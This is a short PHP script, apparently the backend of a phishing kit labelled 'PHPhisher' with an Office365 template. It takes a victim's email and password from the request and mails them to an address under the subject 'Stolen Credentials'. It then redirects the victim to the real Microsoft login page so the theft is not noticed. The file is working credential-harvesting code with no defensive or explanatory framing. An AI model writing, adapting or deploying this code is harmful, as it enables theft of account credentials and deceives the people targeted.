<?php
$password = $_GET['password'];
$email = $_GET['email'];
 
$subject ="Stolen Credentials (Office365 Template)";
$message="Email: $email \nPassword: $password";
$header="from: PHPhisher";
$to ='test@test.com';
if (!$password || !$email ){
echo '<script script type="text/javascript">';
echo 'window.location.href ="index.html";'; 
echo '</script>';
}
else{
echo '<script script type="text/javascript">';
echo 'window.location.href ="https://login.microsoftonline.com/";'; 
echo '</script>';
mail($to,$subject,$message,$header);
}
?>